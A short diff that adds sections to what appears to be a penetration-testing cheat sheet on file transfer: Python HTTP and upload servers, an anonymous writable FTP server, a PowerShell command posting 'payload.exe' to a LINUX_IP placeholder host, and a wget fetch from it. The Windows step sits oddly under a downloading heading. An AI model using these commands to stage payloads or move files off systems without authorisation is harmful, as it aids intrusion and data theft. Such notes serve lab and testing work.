@@ -4,3 +4,23 @@ pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21 -w ( Start FTP Server )
 ftp <IP> 
 Anonymous Login
+
+# HTTP Downloader Server
+
+python3 -m http.server <PORT>
+
+Windows:
+Invoke-WebRequest `
+  -Uri http://LINUX_IP:8000/upload `
+  -Method POST `
+  -InFile payload.exe `
+  -ContentType "application/octet-stream"
+
+Linux:
+wget http://LINUX_IP:<PORT>/file.txt
+
+
+# HTTP File Upload Server
+
+pip3 install uploadserver
+python3 -m uploadserver 8000
